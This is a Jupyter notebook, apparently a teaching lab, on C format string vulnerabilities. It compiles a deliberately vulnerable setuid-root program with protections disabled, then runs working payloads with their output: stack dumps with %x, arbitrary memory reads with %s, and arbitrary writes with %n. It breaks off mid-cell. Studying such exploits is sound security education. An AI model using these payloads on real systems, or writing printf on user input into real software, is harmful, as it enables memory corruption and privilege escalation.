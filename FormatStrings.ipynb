{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Format Strings\n",
    "http://www.cplusplus.com/reference/cstdio/printf/?kw=printf\n",
    "\n",
    "- `printf()` in C/C++ can be used to print fixed strings, variables in many different formats\n",
    "- hello.c program uses `printf()` incorrectly!\n",
    "- \"Hello World\\n\" string technically is the format string (devoid of special escape sequences called format parameters)\n",
    "- format parameters begins with a `%` sign; for each format parameter (%) function expects arguments\n",
    "- format specifier follows this prototype:\n",
    "`%[flags][width][.precision][length]specifier`\n",
    "\n",
    "- following parameter requires values as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %d | Decimal |\n",
    "| %u | Unsigned decimal |\n",
    "| %x | Hexadecimal |\n",
    "\n",
    "- the following parameters expect pointers as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %s | String |\n",
    "| %n | Number of bytes written so far |\n",
    "| %p | Memory address |"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw-r--r-- 1 user user 78 Aug  7 10:05 hello.c\r\n"
     ]
    }
   ],
   "source": [
    "# copy hello.c from booksrc folder\n",
    "! cp booksrc/hello.c .\n",
    "! ls -al hello.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "\r\n",
      "int main() {\r\n",
      "    printf(\"Hello World!\\n\");\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat hello.c"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Use compile.sh script to compile c programs\n",
    "- disables all compiler and system level bufferoverflow protections"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# compile and run hello.c\n",
    "! cp booksrc/compile.sh .\n",
    "! chmod u+x compile.sh\n",
    "! ./compile.sh hello.c hello.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello World!\r\n"
     ]
    }
   ],
   "source": [
    "! ./hello.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Format Parameters Examples\n",
    "- copy fmt_strings.c from booksrc; examine, compile and run it"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/fmt_strings.c ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "// fmt_strings.c\r\n",
      "\r\n",
      "#include <stdio.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main() {\r\n",
      "   char string[10];\r\n",
      "   int A = -73;\r\n",
      "   unsigned int B = 31337;\r\n",
      "\r\n",
      "   strcpy(string, \"sample\");\r\n",
      "\r\n",
      "   // Example of printing with different format string\r\n",
      "   printf(\"[A] Dec: %d, Hex: %x, Unsigned: %u\\n\", A, A, A);\r\n",
      "   printf(\"[B] Dec: %d, Hex: %x, Unsigned: %u\\n\", B, B, B);\r\n",
      "   printf(\"[field width on B] 3: '%3u', 10: '%10u', '%08u'\\n\", B, B, B);\r\n",
      "   printf(\"[string] %s  Address %p\\n\", string, string);\r\n",
      "\r\n",
      "   // Example of unary address operator (dereferencing) and a %x format string\r\n",
      "   printf(\"variable A is at address: %p\\n\", &A);\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat fmt_strings.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh fmt_strings.c fmt_strings.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[A] Dec: -73, Hex: ffffffb7, Unsigned: 4294967223\r\n",
      "[B] Dec: 31337, Hex: 7a69, Unsigned: 31337\r\n",
      "[field width on B] 3: '31337', 10: '     31337', '00031337'\r\n",
      "[string] sample  Address 0xffffd0a2\r\n",
      "variable A is at address: 0xffffd09c\r\n"
     ]
    }
   ],
   "source": [
    "# note high value for A: -ve value is stored in two's complement\n",
    "! ./fmt_strings.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Format Parameter %n Example\n",
    "- %n - uncommon, but let's understand how it works\n",
    "- %n - writes the number of bytes written so far to the corresponding variable's address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp booksrc/fmt_uncommon.c ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "\r\n",
      "int main() {\r\n",
      "   int A = 5, B = 7, count_one, count_two;\r\n",
      "\r\n",
      "   // Example of a %n format string\r\n",
      "   printf(\"The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\\n\", &count_one, &count_two);\r\n",
      "\r\n",
      "   printf(\"count_one: %d\\n\", count_one);\r\n",
      "   printf(\"count_two: %d\\n\", count_two);\r\n",
      "\r\n",
      "   // Stack Example\r\n",
      "   printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\r\n",
      "\r\n",
      "   exit(0);\r\n",
      "}\t\r\n"
     ]
    }
   ],
   "source": [
    "cat fmt_uncommon.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh fmt_uncommon.c fmt_uncommon.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.\r\n",
      "count_one: 46\r\n",
      "count_two: 113\r\n",
      "A is 5 and is at ffffd0a8.  B is 7.\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_uncommon.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### structure of stack when printf( ) is called in fmt_uncommon.c\n",
    "- look at the last printf()\n",
    "\n",
    "### printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\n",
    "\n",
    "- hint, parameters are pushed on reverse order\n",
    "\n",
    "\n",
    "|Top of the stack|\n",
    "| :----: |\n",
    "| Address of format string (first argument)|\n",
    "| Value of A|\n",
    "| Address of A|\n",
    "| Value of B|\n",
    "| ... |\n",
    "| Bottom of the Stack|"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### what if fewer arguments are passed to printf()?\n",
    "- printf(\"A is %d and is at %08x. B is %x.\\n\", A, &A);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "! sed -e 's/, B)/)/' fmt_uncommon.c > fmt_uncommon2.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "14c14\r\n",
      "<    printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\r\n",
      "---\r\n",
      ">    printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A);\r\n"
     ]
    }
   ],
   "source": [
    "! diff fmt_uncommon.c fmt_uncommon2.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh fmt_uncommon2.c fmt_uncommon2.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.\r\n",
      "count_one: 46\r\n",
      "count_two: 113\r\n",
      "A is 5 and is at ffffd0a8.  B is 804845d.\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_uncommon2.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Format String Vulnerability\n",
    "- if string is printed directly `printf(string)` instead of `printf(\"%s\", string)`\n",
    "- compile and run fmt_vuln.c from booksrc folder\n",
    "\n",
    "```bash\n",
    "$ ./compile.sh fmt_vuln.c fmt_vuln.exe\n",
    "$ sudo chown root:root ./fmt_vuln.exe\n",
    "$ sudo chmod u+s ./fmt_vuln.exe\n",
    "$ ./fmt_vuln.exe testing\n",
    "$ ./fmt_vuln.exe testing%x\n",
    "$ ./fmt_vuln.exe $(perl -e 'print \"%08x.\"x40')\n",
    "```\n",
    "\n",
    "- print four repeating bytes in reverse order (little-endian architecture)\n",
    "- $ printf \"\\x25\\x30\\x38\\x78\\x2e\\n\"\n",
    "    - these are the arguments for format string stored in higher memory addresses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "   char text[1024];\r\n",
      "   static int test_val = -72;\r\n",
      "\r\n",
      "   if(argc < 2) {\r\n",
      "      printf(\"Usage: %s <text to print>\\n\", argv[0]);\r\n",
      "      exit(0);\r\n",
      "   }\r\n",
      "   strcpy(text, argv[1]);\r\n",
      "\r\n",
      "   printf(\"The right way to print user-controlled input:\\n\");\r\n",
      "   printf(\"%s\", text);\r\n",
      "\r\n",
      "   printf(\"\\nThe wrong way to print user-controlled input:\\n\");\r\n",
      "   printf(text);\r\n",
      "\r\n",
      "   printf(\"\\n\");\r\n",
      "\r\n",
      "   // Debug output\r\n",
      "   printf(\"[*] test_val @ 0x%08x = %d 0x%08x\\n\", &test_val, test_val, test_val);\r\n",
      "\r\n",
      "   exit(0);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cp ./booksrc/fmt_vuln.c .\n",
    "! cat fmt_vuln.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for user: "
     ]
    }
   ],
   "source": [
    "! echo user | sudo -S ./compile.sh fmt_vuln.c fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for user: "
     ]
    }
   ],
   "source": [
    "# user is password for sudo user\n",
    "! echo user | sudo -S chown root:root ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxr-xr-x 1 root root 9624 Aug  7 10:12 fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "# check ownership of the fmt_vuln.exe\n",
    "! ls -al fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for user: "
     ]
    }
   ],
   "source": [
    "! echo user | sudo -S chmod u+s ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-xr-x 1 root root 9624 Aug  7 10:12 fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./fmt_vuln.exe <text to print>\r\n"
     ]
    }
   ],
   "source": [
    "# run fmt_vuln.exe\n",
    "! ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testing\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testingtesting%s\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# what if you provide %s as value\n",
    "! ./fmt_vuln.exe testing%s\n",
    "# notice testing repeats twice!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing%x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testingffffccb0\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# what if you provide %x as value\n",
    "! ./fmt_vuln.exe testing%x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "bfffe780.00000000.b7fff858.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# process can be used repeatedly to examine stack memory\n",
    "# just provide a lot of format parameter as string and see what's on stack\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"%08x.\"x40')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%08x."
     ]
    }
   ],
   "source": [
    "# bunch of 2e78383025 are repeated\n",
    "# each four bytes values are reversed due to little-endian architecture\n",
    "! perl -e 'print \"\\x25\\x30\\x38\\x78\\x2e\"'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "Segmentation fault\r\n"
     ]
    }
   ],
   "source": [
    "# try to print the same results in string\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"%s.\"x40')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Reading from Arbitrary Memory Addresses\n",
    "- `%s` format parameter can be used to read from arbitrary memory addresses\n",
    "- part of the original format string can be used to supply an address to the %s format parameter\n",
    "- if a valid memory address is used, this process could be used to read a string found at that memory address\n",
    "- compile and run booksrc/getenvaddr.c\n",
    "- use the path address to provide the value for %s\n",
    "```bash\n",
    "$ ./fmt_vuln.exe $(print \"\\x address in reverse bytes\")%08x.%08x.%08x.%s\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA.%08x.%08x.%08x.%08x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAA.ffffcca0.f7dd0658.080484f0.41414141\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe AAAA.%08x.%08x.%08x.%08x\n",
    "# notice that fourth parameter is repeating from begnning of the format string \n",
    "# AAAA to gets its data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%08x.%08x.%08x.%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "Segmentation fault\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe AAAA%08x.%08x.%08x.%s\n",
    "# why do we get segfault?\n",
    "# it's attempting to print string at the address AAAA"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH=/home/user/miniconda3/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\r\n"
     ]
    }
   ],
   "source": [
    "# how about we provide some valid memory address instead of AAAA\n",
    "! env | grep $PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "# compile and run getevnaddr.c to find the memory address of env variables respective to programs\n",
    "! cp ./booksrc/getenvaddr.c ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tchar *ptr;\r\n",
      "\r\n",
      "\tif(argc < 3) {\r\n",
      "\t\tprintf(\"Usage: %s <environment variable> <target program name>\\n\", argv[0]);\r\n",
      "\t\texit(0);\r\n",
      "\t}\r\n",
      "\tptr = getenv(argv[1]); /* get env var location */\r\n",
      "\tptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */\r\n",
      "\tprintf(\"%s will be at %p\\n\", argv[1], ptr);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat getenvaddr.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh getenvaddr.c getenvaddr.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH will be at 0xffffd637\r\n"
     ]
    }
   ],
   "source": [
    "! ./getenvaddr.exe PATH ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "7���%08x.%08x.%08x.%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "7���ffffcca0.f7dd0658.080484f0.ome/user/miniconda3/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# lets try to read the value of PATH using fmt_vuln.exe\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x37\\xd6\\xff\\xff\"')%08x.%08x.%08x.%s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Notice /h is missing from /home/user/...\n",
    "- this is because getenvaddr.exe (14) is 2 bytes longer that fmt_vuln.exe (12)\n",
    "- we can stubtract 2 from the least siginificant byte by reducing the PATH address by 2 bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "35"
     ]
    }
   ],
   "source": [
    "! printf \"%x\" $((0x37-2))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "5���%08x.%08x.%08x.%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "5���ffffcca0.f7dd0658.080484f0./home/user/miniconda3/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x35\\xd6\\xff\\xff\"')%08x.%08x.%08x.%s\n",
    "# now we see our complete path"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing to Arbitrary Memory Addresses\n",
    "- %s is used read an arbitrary memory address\n",
    "- `%n` format parameter can be used to write to arbitrary memory address\n",
    "- `test_val` variable has been printing its address and value in the debug statement\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%08x.%08x.%08x.%n\n",
    "```\n",
    "- the resulting value in the test variable depends on the number of bytes written before the `%n`\n",
    "- this can be controlled to a a greater degree by manipulating the field width option\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%x%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%100x%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%400x%n\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testing\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! fmt_vuln.exe testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%08x.%08x.%08x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0.f7dd0658.080484f0.\r\n",
      "[*] test_val @ 0x0804a02c = 31 0x0000001f\r\n"
     ]
    }
   ],
   "source": [
    "# test_val is @ 0x0804a02c\n",
    "# instead of reading test_val, let's write to it\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%08x.%08x.%08x.%n\n",
    "# Notice the test_val which is the total bytes written thus far by printf()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x.%x.%x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0.f7dd0658.80484f0.\r\n",
      "[*] test_val @ 0x0804a02c = 30 0x0000001e\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x.%x.%x.%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x.%x.%100x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0.f7dd0658.                                                                                             80484f0.\r\n",
      "[*] test_val @ 0x0804a02c = 123 0x0000007b\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x.%x.%100x.%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x.%x.%200x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0.f7dd0658.                                                                                                                                                                                                 80484f0.\r\n",
      "[*] test_val @ 0x0804a02c = 223 0x000000df\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x.%x.%200x.%n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing User-Controlled Values (0xaddress)\n",
    "- the above trick (manipulating width) works for small numbers but won't work for large ones like memory addresses\n",
    "- let's write 0xDDCCBBAA to variable test_val\n",
    "- 0xAA goes to least significant byte, 0xBB to next byte and so on and 0xDD goes to the most significant byte\n",
    "- 0xAA -> 0x0804a02c\n",
    "- 0xBB -> 0x0804a02d\n",
    "- 0xCC -> 0x0804a02e\n",
    "- 0xDD -> 0x0804a02f"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x%x%8x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0f7dd0658 80484f0\r\n",
      "[*] test_val @ 0x0804a02c = 28 0x0000001c\r\n"
     ]
    }
   ],
   "source": [
    "# findout the width value to print 0xaa in the right location\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x%x%8x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "150\r\n"
     ]
    }
   ],
   "source": [
    "# 0xaa is final value - 28 is what width 8 provides\n",
    "!echo $(( 0xaa - 28 + 8))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x%x%150x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0f7dd0658                                                                                                                                               80484f0\r\n",
      "[*] test_val @ 0x0804a02c = 170 0x000000aa\r\n"
     ]
    }
   ],
   "source": [
    "# replace width 8 with 150\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x%x%150x%n\n",
    "# text_val = 0x000000aa\n",
    "# we've aa least significant byte in right the place"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%8x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bffffcc90f7dd0658 80484f0\r\n",
      "[*] test_val @ 0x0804a02c = 52 0x00000034\r\n"
     ]
    }
   ],
   "source": [
    "# next write 0xbb, 0xcc, and 0xdd\n",
    "# need more %x%n format to write to each addresses\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%8x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "126\r\n"
     ]
    }
   ],
   "source": [
    "# what is the width so the final value is 0xaa\n",
    "! echo $(( 0xaa-52+8 ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%126x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bffffcc90f7dd0658                                                                                                                       80484f0\r\n",
      "[*] test_val @ 0x0804a02c = 170 0x000000aa\r\n"
     ]
    }
   ],
   "source": [
    "# replace width 8 width 126 to write 0xaa\n",
